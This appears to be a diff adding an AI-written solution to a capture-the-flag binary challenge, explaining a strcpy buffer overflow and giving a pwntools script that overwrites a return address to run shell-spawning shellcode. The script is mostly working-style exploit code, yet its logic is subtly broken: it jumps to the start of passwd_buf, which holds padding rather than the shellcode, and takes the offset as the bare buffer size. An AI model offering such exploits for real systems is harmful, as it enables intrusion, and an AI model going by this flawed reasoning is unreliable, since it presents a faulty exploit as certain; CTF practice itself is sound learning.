@@ -1,0 +1,79 @@
+To solve this challenge using pwntools, we need to exploit the `check` function. The key vulnerability here is in the `strcpy` function, which can lead to a buffer overflow. The `mprotect` function is used to change the memory protection of the page containing `passwd_buf` to be writable and executable, which allows us to execute shellcode.
+
+Here are the steps and the corresponding code to solve this challenge:
+
+1. **Identify the Buffer Overflow Vulnerability:**
+   - The `strcpy` function in the `check` function does not check the length of the input, leading to a potential buffer overflow.
+   - The `mprotect` function makes the memory page containing `passwd_buf` writable and executable, allowing us to inject and execute shellcode.
+
+2. **Craft the Exploit:**
+   - We need to overflow the `passwd_buf` to overwrite the return address of the `validate_passwd` function with the address of our shellcode.
+   - The shellcode will be placed in the `passwd_buf` after the return address.
+
+3. **Use pwntools to Automate the Exploit:**
+
+Here is the Python code using pwntools to exploit the binary:
+
+```python
+from pwn import *
+
+# Set up the process
+binary = './int'
+elf = ELF(binary)
+p = process(binary)
+
+# Find the offset to the return address
+context.log_level = 'debug'
+offset = 50  # This is the size of the buffer, found by analyzing the decompiled code
+
+# Generate shellcode
+shellcode = asm(shellcraft.sh())
+
+# Calculate the address where the shellcode will be placed
+# Since mprotect makes the page containing passwd_buf executable, we can place the shellcode there
+shellcode_addr = elf.symbols['passwd_buf']
+
+# Construct the payload
+payload = b'A' * offset  # Fill the buffer
+payload += p32(shellcode_addr)  # Overwrite the return address with the address of the shellcode
+payload += shellcode  # Append the shellcode
+
+# Send the payload
+p.sendlineafter(b'Plz input your passwd:\n', payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation of the Code:
+
+1. **Set up the Process:**
+   - `binary = './int'`: Specifies the path to the binary.
+   - `elf = ELF(binary)`: Loads the binary into an ELF object for analysis.
+   - `p = process(binary)`: Starts the process.
+
+2. **Find the Offset:**
+   - `offset = 50`: The buffer size is 50 bytes, as seen in the decompiled code.
+
+3. **Generate Shellcode:**
+   - `shellcode = asm(shellcraft.sh())`: Generates a simple shellcode to spawn a shell.
+
+4. **Calculate the Address:**
+   - `shellcode_addr = elf.symbols['passwd_buf']`: Gets the address of `passwd_buf`.
+
+5. **Construct the Payload:**
+   - `payload = b'A' * offset`: Fills the buffer with 50 'A's.
+   - `payload += p32(shellcode_addr)`: Overwrites the return address with the address of `passwd_buf`.
+   - `payload += shellcode`: Appends the shellcode to the payload.
+
+6. **Send the Payload:**
+   - `p.sendlineafter(b'Plz input your passwd:\n', payload)`: Sends the payload after the prompt.
+
+7. **Interact with the Shell:**
+   - `p.interactive()`: Allows interaction with the spawned shell.
+
+### Running the Exploit:
+- Save the script to a file, e.g., `exploit.py`.
+- Run the script: `python3 exploit.py`.
+
+This should give you a shell on the target binary, allowing you to interact with it.
